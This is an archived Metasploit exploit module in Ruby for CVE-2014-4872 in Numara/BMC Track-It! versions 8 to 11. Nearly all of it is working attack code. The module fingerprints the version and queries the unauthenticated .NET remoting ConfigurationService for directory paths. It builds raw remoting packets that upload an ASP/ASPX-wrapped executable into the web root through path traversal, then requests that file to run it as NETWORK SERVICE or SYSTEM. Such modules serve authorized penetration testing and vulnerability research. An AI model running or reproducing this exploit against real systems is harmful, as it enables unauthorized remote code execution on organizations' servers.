##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# NOTE !!!
# This exploit is kept here for archiving purposes only.
# Please refer to and use the version that has been accepted into the Metasploit framework.

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Numara / BMC Track-It! FileStorageService Arbitrary File Upload',
      'Description'    => %q{
        This module exploits an arbitrary file upload vulnerability in Numara / BMC Track-It!
        v8 to v11.X.
        The application exposes the FileStorageService .NET remoting service on port 9010
        (9004 for version 8) which accepts unauthenticated uploads. This can be abused by
        a malicious user to upload a ASP or ASPX file to the web root leading to arbitrary
        code execution as NETWORK SERVICE or SYSTEM.
        This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107,
        10.0.0.143, 9.0.30.248 and 8.0.2.51.
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>'    # vulnerability discovery and MSF module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2014-4872' ],
          [ 'OSVDB', '112741' ],
          [ 'US-CERT-VU', '121036' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Oct/34' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/generic/bmc-track-it-11.3.txt' ]
        ],
      'DefaultOptions' => { 'WfsDelay' => 30 },
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          [ 'Numara / BMC Track-It! v9 to v11.X - Windows', {} ],
        ],
      'Privileged'     => false,
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Oct 7 2014'
    ))

    register_options(
      [
        OptPort.new('RPORT',
          [true, 'TrackItWeb application port', 80]),
        OptPort.new('RPORT_REMOTING',
          [true, '.NET remoting service port', 9010]),
        OptInt.new('SLEEP',
          [true, 'Seconds to sleep while we wait for ASP(X) file to be written', 15]),
        OptString.new('TARGETURI',
          [true, 'Base path to the TrackItWeb application', '/TrackItWeb/'])
      ], self.class)
  end


  def get_version
    res = send_request_cgi!({
      'uri'    => normalize_uri(datastore['TARGETURI']),
      'method' => 'GET'
    })
    if res and res.code == 200 and res.body.to_s =~ /\/TrackItWeb\/Content\.([0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,4})\//
      version = $1.split(".")
      return version
    end
  end


  def check
    version = get_version
    if version != nil
      if (version[0].to_i < 11) or
      (version[0].to_i == 11 and version[1].to_i <= 3) or
      (version[0].to_i == 11 and version[1].to_i == 3 and version[2].to_i == 0 and version[3].to_i < 999)
        ctx = { 'Msf' => framework, 'MsfExploit' => self }
        sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => datastore['RPORT_REMOTING'], 'Context' => ctx })
        if not sock.nil?
          sock.write(rand_text_alpha(rand(200) + 100))
          res = sock.recv(1024)
          if res =~ /Tcp channel protocol violation: expecting preamble/
            return Exploit::CheckCode::Appears
          end
          sock.close
        end
      else
        return Exploit::CheckCode::Safe
      end
    end
    return Exploit::CheckCode::Unknown
  end


  def longest_common_substr(strings)
    shortest = strings.min_by &:length
    maxlen = shortest.length
    maxlen.downto(0) do |len|
      0.upto(maxlen - len) do |start|
        substr = shortest[start,len]
        return substr if strings.all?{|str| str.include? substr }
      end
    end
  end


  def get_traversal_path
    #
    # ConfigurationService packet structure:
    #
    # @packet_header_pre_packet_size
    # packet_size (4 bytes)
    # @packet_header_pre_uri_size
    # uri_size (2 bytes)
    # @packet_header_pre_uri
    # uri
    # @packet_header_post_uri
    # packet_body_start_pre_method_size
    # method_size (1 byte)
    # method
    # @packet_body_pre_type_size
    # type_size (1 byte)
    # @packet_body_pre_type
    # type
    # @packet_terminator
    #
    # .NET remoting packet spec can be found at http://msdn.microsoft.com/en-us/library/cc237454.aspx
    #
    packet_body_start_pre_method_size = [
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x15, 0x11, 0x00, 0x00, 0x00, 0x12
    ]

    service = "TrackIt.Core.ConfigurationService".gsub(/TrackIt/,(@version == 11 ? "Trackit" : "Numara.TrackIt"))
    method = "GetProductDeploymentValues".gsub(/TrackIt/,(@version == 11 ? "Trackit" : "Numara.TrackIt"))
    type = "TrackIt.Core.Configuration.IConfigurationSecureDelegator, TrackIt.Core.Configuration, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null".gsub(/TrackIt/,(@version == 11 ? "TrackIt" : "Numara.TrackIt"))

    uri = "tcp://" + rhost + ":" + @remoting_port.to_s + "/" + service

    file_storage_dir_str = "FileStorageDataDirectory"
    web_data_dir_str = "WebDataCacheDirectory"

    packet_size =
      @packet_header_pre_uri_size.length +
      2 + # uri_size
      @packet_header_pre_uri.length +
      uri.length +
      @packet_header_post_uri.length +
      packet_body_start_pre_method_size.length +
      1 + # method_size
      method.length +
      @packet_body_pre_type_size.length +
      1 + # type_size
      @packet_body_pre_type.length +
      type.length

    # start of packet and packet size (4 bytes)
    buf = @packet_header_pre_packet_size.pack('C*')
    buf << Array(packet_size).pack('L*')

    # uri size (2 bytes)
    buf << @packet_header_pre_uri_size.pack('C*')
    buf << Array(uri.length).pack('S*')

    # uri
    buf << @packet_header_pre_uri.pack('C*')
    buf << uri.bytes.to_a.pack('C*')
    buf << @packet_header_post_uri.pack('C*')

    # method name
    buf << packet_body_start_pre_method_size.pack('C*')
    buf << Array(method.length).pack('C*')
    buf << method.bytes.to_a.pack('C*')

    # type name
    buf << @packet_body_pre_type_size.pack('C*')
    buf << Array(type.length).pack('C*')
    buf << @packet_body_pre_type.pack('C*')
    buf << type.bytes.to_a.pack('C*')

    buf << @packet_terminator.pack('C*')

    ctx = { 'Msf' => framework, 'MsfExploit' => self }
    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => datastore['RPORT_REMOTING'], 'Context' => ctx })
    if sock.nil?
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{@remoting_port.to_s} - Failed to connect to remoting service")
    else
      print_status("#{rhost}:#{@remoting_port} - Getting traversal path...")
    end
    sock.write(buf)

    # read from the socket for up to (SLEEP / 2) seconds
    counter = 0
    web_data_dir = nil
    file_storage_dir = nil
    while counter < datastore['SLEEP']
      begin
        readable,writable,error = IO.select([sock], nil, nil, datastore['SLEEP'] / 2)
        if readable == nil
          break
        else
          sock = readable[0]
        end
        buf_reply = sock.readpartial(4096)
        if (index = (buf_reply.index(file_storage_dir_str))) != nil
          # after file_storage_dir_str, discard 5 bytes then get file_storage_dir_size
          size = buf_reply[index + file_storage_dir_str.length + 5,1].unpack('C*')[0]
          file_storage_dir = buf_reply[index + file_storage_dir_str.length + 6, size]
          if file_storage_dir != nil and web_data_dir != nil
            break
          end
        end
        if (index = (buf_reply.index(web_data_dir_str))) != nil
          # after web_data_dir_str, discard 5 bytes then get web_data_dir_size
          size = buf_reply[index + web_data_dir_str.length + 5,1].unpack('C*')[0]
          web_data_dir = buf_reply[index + web_data_dir_str.length + 6, size]
          if file_storage_dir != nil and web_data_dir != nil
            break
          end
        end
        counter += 1
        sleep(0.5)
      rescue SystemCallError
        break
      end
    end
    sock.close

    if file_storage_dir != nil and web_data_dir != nil
      # Now we need to adjust the paths before we calculate the traversal_size
      # On the web_data_dir, trim the last part (the Cache directory) and add the Web\Installers part
      # which is the path accessible without authentication.
      # On the file_storage_dir, add the IncidentRepository part where the files land by default.
      # We then find the common string and calculate the traversal_path.
      web_data_dir = web_data_dir[0,web_data_dir.rindex("\\")] + "\\Web\\Installers\\"
      file_storage_dir << "\\Repositories\\IncidentRepository"
      common_str = longest_common_substr([file_storage_dir, web_data_dir])
      traversal_size =  file_storage_dir[common_str.rindex("\\"), file_storage_dir.length].scan("\\").length
      traversal_path = "..\\" * traversal_size + web_data_dir[common_str.rindex("\\") + 1,common_str.length]
      return traversal_path
    else
      return nil
    end
    # Note: version 8 always returns nil as the GetProductDeploymentValues does not exist
  end


  def send_file(traversal_path, filename, file_content)
    #
    # FileStorageService packet structure:
    #
    # @packet_header_pre_packet_size
    # packet_size (4 bytes)
    # @packet_header_pre_uri_size
    # uri_size (2 bytes)
    # @packet_header_pre_uri
    # uri
    # @packet_header_post_uri
    # packet_body_start_pre_method_size
    # method_size (1 byte)
    # method
    # @packet_body_pre_type_size
    # type_size (1 byte)
    # @packet_body_pre_type
    # type
    # packet_body_pre_repository_size
    # repository_size (1 byte)
    # repository
    # packet_body_pre_filepath_size
    # filepath_size (1 byte)
    # filepath
    # packet_body_pre_binary_lib_size
    # binary_lib_size (1 byte)
    # binary_lib
    # packet_body_pre_file_content_decl_size
    # file_content_decl_size (1 byte)
    # file_content_decl
    # packet_body_pre_filesize
    # file_size (4 bytes)
    # packet_body_pre_filecontent
    # file_content
    # @packet_terminator
    #
    # .NET remoting packet spec can be found at http://msdn.microsoft.com/en-us/library/cc237454.aspx
    #
    packet_body_start_pre_method_size = [
      0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff,
      0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x15, 0x14, 0x00, 0x00, 0x00, 0x12
    ]

    packet_body_pre_repository_size = [
      0x10, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
      0x00, 0x0a, 0x09, 0x02, 0x00, 0x00, 0x00, 0x06,
      0x03, 0x00, 0x00, 0x00
    ]

    packet_body_pre_filepath_size = [
      0x06, 0x04, 0x00, 0x00, 0x00
    ]

    packet_body_pre_binary_lib_size = [
      0x0c, 0x05, 0x00, 0x00, 0x00
    ]

    packet_body_pre_file_content_decl_size = [
      0x05, 0x02, 0x00, 0x00, 0x00
    ]

    packet_body_pre_file_size = [
      0x01, 0x00, 0x00, 0x00, 0x09, 0x5f, 0x72, 0x61,
      0x77, 0x42, 0x79, 0x74, 0x65, 0x73, 0x07, 0x02,
      0x05, 0x00, 0x00, 0x00, 0x09, 0x06, 0x00, 0x00,
      0x00, 0x0f, 0x06, 0x00, 0x00, 0x00
    ]

    packet_body_pre_filecontent = [ 0x02 ]

    service = "TrackIt.Core.FileStorageService".gsub(/TrackIt/,(@version == 11 ? "TrackIt" : "Numara.TrackIt"))
    method = "Create"
    type = "TrackIt.Core.FileStorage.IFileStorageSecureDelegator, TrackIt.Core.FileStorage, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null".gsub(/TrackIt/,(@version == 11 ? "TrackIt" : "Numara.TrackIt"))
    repository = "IncidentRepository"
    binary_lib = "TrackIt.Core.FileStorage, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null".gsub(/TrackIt/,(@version == 11 ? "TrackIt" : "Numara.TrackIt"))
    file_content_decl = "TrackIt.Core.FileStorage.FileContent".gsub(/TrackIt/,(@version == 11 ? "TrackIt" : "Numara.TrackIt"))

    uri = "tcp://" + rhost + ":" + @remoting_port.to_s + "/" + service

    filepath = traversal_path + filename

    packet_size =
      @packet_header_pre_uri_size.length +
      2 + # uri_size
      @packet_header_pre_uri.length +
      uri.length +
      @packet_header_post_uri.length +
      packet_body_start_pre_method_size.length +
      1 + # method_size
      method.length +
      @packet_body_pre_type_size.length +
      1 + # type_size
      @packet_body_pre_type.length +
      type.length +
      packet_body_pre_repository_size.length +
      1 + # repository_size
      repository.length +
      packet_body_pre_filepath_size.length +
      1 + # filepath_size
      filepath.length +
      packet_body_pre_binary_lib_size.length +
      1 + # binary_lib_size
      binary_lib.length +
      packet_body_pre_file_content_decl_size.length +
      1 + # file_content_decl_size
      file_content_decl.length +
      packet_body_pre_file_size.length +
      4 + # file_size
      packet_body_pre_filecontent.length +
      file_content.length

    # start of packet and packet size (4 bytes)
    buf = @packet_header_pre_packet_size.pack('C*')
    buf << Array(packet_size).pack('L*')

    # uri size (2 bytes)
    buf << @packet_header_pre_uri_size.pack('C*')
    buf << Array(uri.length).pack('S*')

    # uri
    buf << @packet_header_pre_uri.pack('C*')
    buf << uri.bytes.to_a.pack('C*')
    buf << @packet_header_post_uri.pack('C*')

    # method name
    buf << packet_body_start_pre_method_size.pack('C*')
    buf << Array(method.length).pack('C*')
    buf << method.bytes.to_a.pack('C*')

    # type name
    buf << @packet_body_pre_type_size.pack('C*')
    buf << Array(type.length).pack('C*')
    buf << @packet_body_pre_type.pack('C*')
    buf << type.bytes.to_a.pack('C*')

    # repository name
    buf << packet_body_pre_repository_size.pack('C*')
    buf << Array(repository.length).pack('C*')
    buf << repository.bytes.to_a.pack('C*')

    # filepath
    buf << packet_body_pre_filepath_size.pack('C*')
    buf << Array(filepath.length).pack('C*')
    buf << filepath.bytes.to_a.pack('C*')

    # binary lib name
    buf << packet_body_pre_binary_lib_size.pack('C*')
    buf << Array(binary_lib.length).pack('C*')
    buf << binary_lib.bytes.to_a.pack('C*')

    # file content decl
    buf << packet_body_pre_file_content_decl_size.pack('C*')
    buf << Array(file_content_decl.length).pack('C*')
    buf << file_content_decl.bytes.to_a.pack('C*')

    # file size (4 bytes)
    buf << packet_body_pre_file_size.pack('C*')
    buf << Array(file_content.length).pack('L*')

    # file contents
    buf << packet_body_pre_filecontent.pack('C*')
    buf << file_content

    buf << @packet_terminator.pack('C*')

    # send the packet and ignore the response
    ctx = { 'Msf' => framework, 'MsfExploit' => self }
    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => datastore['RPORT_REMOTING'], 'Context' => ctx })
    if sock.nil?
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{@remoting_port.to_s} - Failed to connect to remoting service")
    else
      print_status("#{rhost}:#{@remoting_port} - Uploading payload to #{filename}")
    end
    sock.write(buf)
    sock.close
    # We can't really register our files for cleanup as most of the time we run under the IIS user, not SYSTEM
  end


  def exploit
    @packet_header_pre_packet_size= [
      0x2e, 0x4e, 0x45, 0x54, 0x01, 0x00, 0x00, 0x00,
      0x00, 0x00
    ]

    @packet_header_pre_uri_size = [
      0x04, 0x00, 0x01, 0x01
    ]

    @packet_header_pre_uri = [
      0x00, 0x00
    ]

    # contains binary type (application/octet-stream)
    @packet_header_post_uri = [
      0x06, 0x00, 0x01, 0x01, 0x18, 0x00, 0x00, 0x00,
      0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74,
      0x69, 0x6f, 0x6e, 0x2f, 0x6f, 0x63, 0x74, 0x65,
      0x74, 0x2d, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6d,
      0x00, 0x00
    ]

    @packet_body_pre_type_size = [ 0x12 ]

    @packet_body_pre_type = [ 0x01 ]

    @packet_terminator = [ 0x0b ]

    version = get_version
    if version != nil
      @version = version[0].to_i
    else
      # We assume it's version 9 or below because we couldn't find any version identifiers
      @version = 9
    end

    @remoting_port = datastore['RPORT_REMOTING']

    traversal_path = get_traversal_path
    if traversal_path == nil
      print_error("#{rhost}:#{@remoting_port} - Could not get traversal path, falling back to defaults")
      case @version
      when 9
        traversal_path = "..\\..\\..\\..\\Web Add-On\\Web\\Installers\\"
      when 10
        traversal_path = "..\\..\\..\\..\\..\\Numara Track-It! Web\\Web\\Installers\\"
      when 11
        traversal_path = "..\\..\\..\\..\\..\\Track-It! Web\\Web\\Installers\\"
      end
    end

    # generate our payload
    exe = generate_payload_exe
    if @version == 9
      file_content = Msf::Util::EXE.to_exe_asp(exe)
      filename = rand_text_alpha_lower(rand(6) + 6) + ".asp"
    else
      file_content = Msf::Util::EXE.to_exe_aspx(exe)
      filename = rand_text_alpha_lower(rand(6) + 6) + ".aspx"
    end

    send_file(traversal_path, filename, file_content)

    # sleep a few seconds, sometimes the service takes a while to write to disk
    sleep(datastore['SLEEP'])

    print_status("#{peer} - Executing payload")
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], "Installers", filename),
      'method' => 'GET'
    })

    if res
      if res.code == 500
        print_error("#{peer} - Got HTTP 500, trying again with " + (@version == 9 ? "ASPX" : "ASPX"))
        # try again but now use ASPX instead of ASP or vice-versa
        if @version == 9
          file_content = Msf::Util::EXE.to_exe_aspx(exe)
          filename = rand_text_alpha_lower(rand(6) + 6) + ".aspx"
        else
          file_content = Msf::Util::EXE.to_exe_asp(exe)
          filename = rand_text_alpha_lower(rand(6) + 6) + ".asp"
        end
        send_file(traversal_path, filename, file_content)

        # sleep a few seconds, sometimes the service takes a while to write to disk
        sleep(datastore['SLEEP'])

        print_status("#{peer} - Executing payload")
        res = send_request_cgi({
          'uri'    => normalize_uri(datastore['TARGETURI'], "Installers", filename),
          'method' => 'GET'
        })
      end
    end
    if not res or res.code != 200
      fail_with(Exploit::Failure::Unknown, "#{peer} - Could not execute payload" + (res ? ", got HTTP code #{res.code.to_s}": ""))
    end

    handler
  end
end
